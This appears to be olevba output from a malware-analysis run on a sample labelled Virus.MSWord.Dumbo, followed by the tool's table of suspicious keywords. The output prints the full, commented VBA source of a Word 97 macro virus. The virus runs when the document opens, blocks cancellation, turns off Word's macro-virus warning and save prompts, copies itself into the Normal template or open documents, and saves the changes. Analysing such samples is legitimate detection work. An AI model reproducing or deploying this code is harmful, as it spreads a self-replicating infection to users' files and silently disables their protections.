olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dumbo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dumbo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'// The Following Is A Simple Class
'// Virus. This Was Written To Help
'// Explain The Basics Of A Word 97
'// Class Module Virus. This Does
'// Not Go Into The Theory Of Class
'// Infection But Instead Comments
'// On The Technique Used In This
'// Example.

Private Sub Document_Open()
'// This Hooks The Document Open And Will
'// Run The Code Between The Sub/End Sub

Application.EnableCancelKey = wdCancelDisabled
'// This Prevents The User From Stoping
'// Macro Execution

Options.ConfirmConversions = Yes
'// This Disables Document Conversion
'// Warning... Yes = 0 = False

Options.SaveNormalPrompt = Yes
'// This Disables The Save Changes
'// Warning For The NormalTemplate
'// Again Yes = 0 = False

Options.VirusProtection = Yes
'// Disables Macro Warning
'// Yes = 0 = False

If ThisDocument = ActiveDocument Then Set Target = NormalTemplate Else Set Target = ActiveDocument
'// This Sets The Target To Infect

I = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
'// This Creates The String 'I' To Equal
'// The Viral Code

Set Destination = Target.VBProject.VBComponents.Item(1).CodeModule
'// This Sets The 'Destination' To Which
'// The Virus Will Use To Clear And Infect

Destination.DeleteLines 1, Destination.CountOfLines
'// This Clears The Target Destination
'// So That The Virus Will Have A Clean
'// Module To Infect

Destination.AddFromString I
'// This Adds The Virus Code To The
'// Destination

If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'// If The Target Is The ActiveDocument
'// It Will Save The Changes The Virus
'// Made

End Sub
'// This Ends The Document_Open Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

